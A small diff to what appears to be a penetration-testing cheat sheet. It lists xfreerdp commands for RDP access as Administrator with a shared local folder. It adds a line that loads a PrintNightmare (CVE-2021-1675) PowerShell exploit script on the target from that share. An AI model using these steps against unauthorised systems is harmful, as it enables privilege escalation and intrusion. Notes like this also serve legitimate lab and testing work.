@@ -102,6 +102,8 @@ xfreerdp /u:Administrator /p:password /v:$ip:3389
 xfreerdp /u:Administrator /p:password /v:$ip:3389 /cert:ignore
 xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:$ip:3389 /u:Administrator /p:'password'
 xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:$ip:3389 /u:Administrator /p:'password' /drive:share,/tmp
+
+. \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1 # windows share connect to /tmp linux 
 ```
 
 # File_Transfer ✅
